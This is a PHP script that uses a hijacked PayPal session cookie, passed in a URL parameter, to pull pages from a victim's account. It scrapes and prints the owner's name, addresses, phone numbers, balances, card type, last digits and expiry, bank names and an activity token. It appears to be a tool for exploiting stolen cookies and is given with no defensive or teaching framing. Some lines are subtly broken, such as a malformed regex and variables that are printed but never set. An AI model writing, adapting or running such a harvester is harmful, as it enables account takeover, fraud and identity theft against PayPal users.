<?php
    function GET($url){
        if( $curl = curl_init() ) {
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36");
            curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
            curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'Cookie: '.$_GET['cookie'],
            'Accept: */*')                                                                       
            );
            return curl_exec($curl);
            curl_close($curl);
        }else {
            return "NO_CURL";
        }
    }   
    $result = GET('https://www.paypal.com/myaccount/settings/'); 
    preg_match('!displayName">(.*?)<!si', $result, $name);
    preg_match('!Country&quot;&#x3A;&quot;(.*?)&quot!si', $result, $country);
    preg_match('!city&quot;&#x3A;&quot;(.*?)&quot!si', $result, $city);
    preg_match('!line1&quot;&#x3A;&quot;(.*?)&quot!si', $result, $adress);
    preg_match('!postal_code&quot;&#x3A;&quot;(.*?)&quot!si', $result, $zip);
    preg_match('!state&quot;&#x3A;&quot;(.*?)&quot!si', $result, $state);
    preg_match('!number&quot;&#x3A;&quot;(.*?)&quot!si', $result, $number);
    
    $result = GET('https://www.paypal.com/businessprofile/settings/address');

    preg_match('!line1&quot;&#x3A;&quot;(.*?)&quot!si', $result, $adress2);
    preg_match('!city&quot;&#x3A;&quot;(.*?)&quot!si', $result, $city2);
    preg_match('!postal_code&quot;&#x3A;&quot;(.*?)&quot!si', $result, $zip2);
    preg_match('!state&quot;&#x3A;&quot;(.*?)&quot!si', $result, $state2);
    
    $result = GET('https://www.paypal.com/businessprofile/settings/');

    preg_match('fullName&quot;&#x3A;&quot;(.*?)&quot!si', $result, $name2);
    preg_match('!phoneNumber&quot;&#x3A;&quot;(.*?)&quot!si', $result, $number2);

    $result = GET('https://www.paypal.com/myaccount/home');

    preg_match('!data-total-percentage="(.*?)"!si', $result, $confirm);    

    $result = GET('https://www.paypal.com/businessexp/summary/activityTile?_=1489906078407');

    preg_match('!<td class="date">(.*?)</td>!si', $result, $datet);  
    preg_match('!class="price"><span>(.*?)</span>!si', $result, $pricet); 

    $result = GET('https://www.paypal.com/myaccount/activity');

    preg_match('!data-token="(.*?)"!si', $result, $tokent); 

    $result = GET('https://www.paypal.com/myaccount/money/');

    preg_match('!"brand":"(.*?)"!si', $result, $cctype); 
    preg_match('!"isoCountry":"(.*?)"!si', $result, $cccountry);
    preg_match('!,"totalAvailable":{"amount":"(.*?)"!si', $result, $money);
    preg_match('!"currency":"(.*?)"!si', $result, $moneycur);
    preg_match('!"expYear":(.*?)"!si', $result, $ccexp);
    preg_match('!">x-(.*?)</span>!si', $result, $cc4);
    preg_match('!"expMonthDigit":"(.*?)"!si', $result, $ccexpm);
    preg_match('!"bankName":"(.*?)"!si', $result, $bank);

    $result = GET('https://www.paypal.com/myaccount/wallet');

    preg_match('!cardType&quot;:&quot;(.*?)&quot;!si', $result, $cctype2); 
    preg_match('!totalAvailable&quot;:{&quot;unformattedAmount&quot;:(.*?),!si', $result, $money2);
    preg_match('!currency&quot;:&quot;(.*?)&quot;!si', $result, $moneycur2);
    preg_match('!expirationYear&quot;:(.*?),&quot;!si', $result, $ccexp2);
    preg_match('!lastDigits&quot;:&quot;(.*?)&quot;!si', $result, $cc42);
    preg_match('!expirationMonth&quot;:&quot;(.*?)&quot;!si', $result, $ccexpm2);
    preg_match('!bankName&quot;:&quot;(.*?)&quot!si', $result, $bank2);
      
    echo "cctype2:".$cctype2[1].'; money2:'.$money2[1].'; moneycur2:'.$moneycur2[1].'; ccexp2:'.$ccexp2[1].'; cc42:'.$cc42[1].'; ccexpm2:'.$ccexpm2[1].'; bank2:'.$bank2[1].';'; 

    echo "cctype:".$cctype[1].'; cccountry:'.$cccountry[1].'; money:'.$money[1].'; moneycur:'.$moneycur[1].'; ccexp:'.$ccexp[1].'; cc4:'.$cc4[1].'; ccexpm:'.$ccexpm[1].'; bank:'.$bank[1].';';       

    echo 'Name:'.$name[1].'; Country:'.$country[1].'; City:'.$city[1].'; Adress:'.$adress[1].'; zip:'.$zip[1].'; State:'.$state[1].'; number:'.$number[1].';'; 

    echo 'Name2:'.$name2[1].'; Country2:'.$country2[1].'; City2:'.$city2[1].'; Adress2:'.$adress2[1].'; zip2:'.$zip2[1].'; State2:'.$state2[1].'; number2:'.$number2[1].';'; 

     echo 'confirm:'.$confirm[1].';'; 

      echo 'datet:'.$datet[1].'; pricet:'.$pricet[1].';'; 

    echo 'tokent:'.$tokent[1].';'; 

?>